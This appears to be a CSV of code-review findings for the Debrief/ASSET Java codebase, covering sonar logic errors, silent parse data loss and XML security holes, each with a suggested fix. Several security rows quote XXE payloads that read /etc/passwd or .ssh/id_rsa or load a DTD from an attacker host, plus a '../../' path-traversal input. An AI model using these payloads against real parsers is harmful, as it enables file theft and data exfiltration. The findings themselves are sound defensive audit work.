id,slice,plugin,package,class,file_path,category,issue_type,severity,confidence,status,title,description,instances,trigger_input,suggested_fix,effort,llm_value,related,github_issue
CR-001,A8,org.mwc.asset.legacy,ASSET.Models.Sensor.Initial,NarrowbandSensor,org.mwc.asset.legacy/src/ASSET/Models/Sensor/Initial/NarrowbandSensor.java,algorithm-correctness,logic-error,Critical,High,candidate,Narrowband sensor reports a contact on every narrowband target regardless of ...,"detectThis calls super.detectThis (sonar-equation gate) only when hasBearing is true (L322-L323); then, whenever the target has a NarrowbandRadNoise medium, it creates a DetectionEvent if res is null (L332-L336) and attaches a Doppler frequency. Consequently a target that failed the signal-excess test (or when HasBearing=false) is still reported as detected, at any range, with course and speed. The propagation-loss/steady-array gating is bypassed for all narrowband contacts. (Lines re-read by the merging reviewer; the code matches the description.)",L322-L336,Scenario with a NarrowbandSensor on ownship and a target with NarrowbandRadNoise placed 500 nm away: a detection with frequency is produced every scan even though super.detectThis returns null.,Only create the frequency-only event when the SNR gate passed (e.g. compute a boolean 'detected' from super.detectThis or re-run the SE calculation when hasBearing is false); never fabricate a detection when res==null because SE<=0.,M,Needs reading the control flow of the override against the base-class contract; nothing greppable.,-,
CR-002,A8,org.mwc.asset.legacy,ASSET.Participants,CoreParticipant,org.mwc.asset.legacy/src/ASSET/Participants/CoreParticipant.java,algorithm-correctness,logic-error,Critical,High,candidate,getSelfNoiseFor() always returns 0: own-ship self noise ignored by all passiv...,"getSelfNoiseFor declares 'final double res = 0', calls selfNoise.radiatedEnergyFor(...) and discards the result, so every caller (BroadbandSensor.getOSNoise L252, NarrowbandSensor L458, ActiveBroadbandSensor L217) feeds 0 dB own-ship noise into the passive sonar equation in InitialSensor.detectThis L177. Self noise configured via setSelfNoise/RadiatedCharacteristics has no effect, so signal excess and detection ranges are silently over-estimated for every participant that has a self-noise model. (Lines re-read by the merging reviewer; the code matches the description.)",L671-L680,Any scenario with a participant that has SelfNoise radiated characteristics and a Broadband/Narrowband sensor: detection range is identical whether self noise is 15 dB or 150 dB (see BBSensorTest.testHeloDetection L88-L99 which sets ff self noise 15).,"Return the value: 'res = selfNoise.radiatedEnergyFor(medium, status, brg_degs);' (drop the final).",S,Requires noticing that a computed value is discarded and tracing the callers into the sonar equation; a linter would flag unused result only if configured.,-,
CR-003,A1,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,ScenarioGenerator,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/ScenarioGenerator.java,security,xxe,High,High,candidate,Monte-Carlo scenario/control document parsing allows external entities,"createNewBuilder() configures namespace awareness and a schema-language attribute but never disables doctype/external entities or enables FEATURE_SECURE_PROCESSING; readDocumentFrom() parses the user-supplied scenario template and control file with it. The generated documents are later serialised and written to disk, so entity content (e.g. a local file) is also persisted into the output scenarios.",L394-L443; L477-L506,"ASSET control file with <!DOCTYPE ScenarioController [<!ENTITY f SYSTEM ""file:///C:/Users/analyst/.ssh/id_rsa"">]> and an attribute value &f;","Harden the factory (secure processing, disallow-doctype-decl, no external entities, no XInclude) in createNewBuilder().",S,grep-able,CWE-611,
CR-004,A1+A8,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,ScenarioGenerator,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/ScenarioGenerator.java,security,path-traversal,High,Medium,candidate,Output directory and file names for generated scenarios come from untrusted XML,"setVariances() takes the OutputDirectory attribute of the ScenarioController element straight from the control file; MultiScenarioPresenter only remaps it when isRelativePath() is true, so an absolute path is honoured. writeTheseToFile() then mkdirs() that directory, writes control_file.xml there and writes each scenario to getDirectory()+'/'+id+'/'+scen_name+'.xml' where scen_name is the Name attribute from the scenario template, unescaped, so '../../' sequences escape the directory. RecordToFileObserverType observers are also pointed at the same directory. A crafted control+template pair thus writes attacker-influenced XML anywhere the user can write. || writeTheseToFile builds the output path from the scenario's Name attribute without sanitising (theDir + scen_name + '.xml', L1039); a template whose Scenario Name is '../../evil' writes outside the output directory. With deleteExisting=true it also recursively deletes getDirectory() (L991), a path taken from the control file's OutputDirectory attribute (setVariances L968-L972) unless overridden. Both are untrusted data-file inputs to the Monte-Carlo generator.","L937-L978 (L966); L986-L1060 (L998-L1002, L1031-L1043); L991; L1039; L968-L972","Control file <ScenarioController OutputDirectory=""C:/Users/analyst/Startup""> plus a template whose Scenario Name=""../../evil""",Require the output directory to be chosen through the UI or restricted to the workspace; sanitise scen_name to a safe basename and verify the canonical path stays inside the output directory.,M,"Needed to trace the attribute from the SAX handler through ResultsContainer, the presenter's relative-path check and into the file writer.",MultiScenarioPresenter L549-L568; ScenarioControllerHandler L65-L70,
CR-005,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReader,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReader.java,bug,silent-data-loss,High,High,candidate,"readThisDouble accepts partial numbers, maps NaN to 0, and attribute parse er...","readThisDouble() uses DecimalFormat.parse(), which parses only the longest valid prefix and ignores the remainder, so '1.2E1' becomes 1.2, '12abc' becomes 12 and exponent-notation values written by other tools are silently truncated; 'NaN' is silently turned into 0 (course north). When parsing does fail, HandleDoubleAttribute/HandleDateTimeAttribute and handleOurselves() catch the exception, log it to the trace file and continue, so the attribute silently keeps its default (0, previous value or null) and the user sees a complete-looking plot with wrong numbers. All Debrief/ASSET XML numeric attributes go through this path.",L79-L86; L96-L104; L222-L241; L434-L443,"<fix Course=""9.0E1"" Speed=""1.2E1"" .../> in a .dpf: imported with course 9 deg and speed 1.2 kts instead of 90 deg and 12 kts, no user-visible warning",Use ParsePosition and reject input with unconsumed characters (or Double.parseDouble after normalising the decimal separator); accumulate attribute errors and surface them to the user at end of import instead of trace-only logging.,M,Required knowing DecimalFormat's prefix-parse semantics and following how the handler base class swallows exceptions; not detectable by grep.,-,
CR-006,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReaderWriter,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReaderWriter.java,security,xxe,High,High,candidate,SAX parser for .dpf/.xml/.asf import resolves external entities and DTDs,"getConfiguredParser() returns SAXParserFactory.newInstance().newSAXParser() with no hardening: disallow-doctype-decl, external-general-entities, external-parameter-entities and load-external-dtd are all left at JDK defaults (enabled), and the hardening lines are commented out. Every Debrief plot (.dpf/.xml), ASSET scenario/control file (.asf) and NaturalEarth store goes through doImport(), so a crafted file can read local files into attribute values and exfiltrate them via a parameter-entity SYSTEM URL, or make the parser fetch arbitrary URLs. Entity-expansion bombs are bounded only by the JDK's default jdk.xml limits since FEATURE_SECURE_PROCESSING is never set explicitly.",L86-L103; L157-L163,".dpf beginning <!DOCTYPE plot [<!ENTITY % p SYSTEM ""http://attacker/x.dtd""> %p;]> or <!ENTITY xxe SYSTEM ""file:///etc/passwd""> used inside a Label attribute","In getConfiguredParser set factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING,true), http://apache.org/xml/features/disallow-doctype-decl=true (or the two external-entities features false and load-external-dtd false) and set an EntityResolver that rejects external ids; do the same for ASSETReaderWriter which reuses doImport.",S,"grep-able for the factory call, but confirming that every importer (Debrief plot, ASSET, NaturalEarth) funnels through this one unhardened doImport needed tracing the class hierarchy.",CWE-611,
CR-007,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Util,ShortLocationHandler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Util/ShortLocationHandler.java,bug,silent-data-loss,High,High,candidate,"Unparseable Lat/Long silently produces a position at 0,0","handleOurselves() resets _lat/_long/_depth to 0.0 then parses each attribute; a ParseException is caught and only traced, so elementClosed() still builds a WorldLocation, placing the fix/shape on the equator/prime meridian with no user warning. Combined with readThisDouble's prefix parsing, values such as '5.0E1' silently become 5.0 degrees.",L54-L74; L46-L50,"<shortLocation Lat=""N50.5"" Long=""-1.2"" Depth=""0""/> loads as latitude 0.0",Track parse failure and skip the element (or throw) instead of emitting a default location; report to the user.,S,Needs reading the reset-then-parse-then-construct sequence across two methods.,-,
CR-008,A1+A10,org.mwc.debrief.core,org.mwc.debrief.core.loaders,GpxUtil,org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/GpxUtil.java,security,xxe,High,High,candidate,GPX import via JDOM SAXBuilder and schema Validator with default entity handling,"getDocumentSource() parses the GPX file with new SAXBuilder() (JDOM default: expandEntities=true, external entities resolved) and isValid() re-parses the file with a javax.xml.validation Validator that is also left at defaults. Both are reached from JaxbGpxHelper.unmarshall() for every .gpx opened, so a GPX file can trigger XXE twice. || getDocumentSource builds the GPX document with new SAXBuilder() and no feature hardening, so external general/parameter entities and external DTDs are resolved before schema validation runs (validation happens afterwards on the already-expanded JDOM tree). Entity content flows into track/waypoint names via JAXB unmarshalling, giving local file disclosure and SSRF-style outbound requests from a data file.",L64-L72; L86-L91; L101-L118; L120-L140; L137-L140 (JaxbGpxHelper.unmarshall consumes the source),".gpx with <!DOCTYPE gpx [<!ENTITY x SYSTEM ""file:///etc/passwd"">]><gpx version=""1.1""><trk><name>&x;</name>...",Create SAXBuilder(XMLReaders.NONVALIDATING) and set the external-entity/doctype features false; on the Validator set ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA to empty strings.,S,Needed to know JDOM's default entity behaviour and follow the call chain from JaxbGpxHelper to see the file is parsed twice.,CWE-611,
CR-009,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,security,xxe,High,High,candidate,KML/KMZ DOM parse uses unhardened DocumentBuilderFactory,"doImport() builds a DocumentBuilderFactory with defaults and parses the whole (untrusted) KML text with loader.parse(); doctype declarations and external general/parameter entities are allowed, so a KML or the .kml entry of a KMZ can read local files or make network requests. The pre-pass stripNonValidXMLCharacters does nothing to entities.",L157-L173,".kml containing <!DOCTYPE kml [<!ENTITY x SYSTEM ""file:///etc/hostname"">]> and <name>&x;</name> inside a Placemark","Set FEATURE_SECURE_PROCESSING, disallow-doctype-decl, setExpandEntityReferences(false) and setXIncludeAware(false) on the factory.",S,grep-able,CWE-611,
CR-010,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,bug,null-deref,High,High,candidate,KML import assumes a fixed radar-plot layout; any other KML throws unchecked ...,"For every Placemark with a MultiGeometry the code calls getElementsByTagName(...).item(0).getTextContent() for name/when/coordinates/description without null checks, Integer.parseInt on the first '-' token of the name, indexes coords[2], and substring(startI+7,endI-1) in courseFrom/speedFrom; the LineString branch does fileName.substring(1,len-1) and StringTokenizer.nextToken() three times per point. NPE/NumberFormatException/ArrayIndexOutOfBounds/NoSuchElementException are not in the catch list (L256-L264), so they escape doImport and doZipImport uncaught. Also getElementsByTagName never returns null so the lineString != null test is always true.",L195-L212; L217-L223; L226-L230; L246-L247; L336-L338; L256-L264,"Any Google-Earth KML whose Placemark has a MultiGeometry but a <name> of 'Ship A' or coordinates 'lon,lat' without altitude; or a KML with 2 coordinate tokens per point","Null-check each lookup, validate token counts, catch RuntimeException per Placemark and report a summary to the user.",M,"Needs understanding of DOM API semantics (item(0) null, getElementsByTagName non-null) and the exception flow.",-,
